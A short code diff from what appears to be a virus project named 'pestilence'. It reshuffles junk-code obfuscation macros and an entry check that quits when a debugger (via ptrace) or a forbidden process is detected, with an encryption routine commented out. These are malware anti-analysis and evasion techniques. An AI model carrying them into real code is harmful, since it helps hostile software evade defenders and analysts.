@@ -74,10 +74,10 @@ static int check_proc(const char *dir_path) {
 
 static int check_digit(const char *str) {
 	for (size_t i = 0; str[i]; i++) {
-		JUNK;
 		if (str[i] < '0' || str[i] > '9')
 			return 1;
 	}
+	JUNK;
 	return 0;
 }
 
@@ -163,21 +163,21 @@ static int is_debugged(void) {
 	return res;
 }
 
+int pestilence(void)
+{
+	if (is_debugged() != 0 || forbid_proc() != 0)
+		return 1;
+	JUNK;
+	return 0;
+}
+
+
 //static int	is_debugged(void)
 //{
 //	if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
 //		return (1);
 //	return (0);
 //}
-
-int pestilence(void)
-{
-	JUNK;
-	if (is_debugged() != 0 || forbid_proc() != 0)
-		return 1;
-	return 0;
-}
-
 //void encrypt_rol(uint8_t *data, const size_t size, uint64_t key) {
 //	for (size_t i = 0; i < size; i++) {
 //		//data[i] ^= (key >> (8 * (i % 8))) & 0xFF;
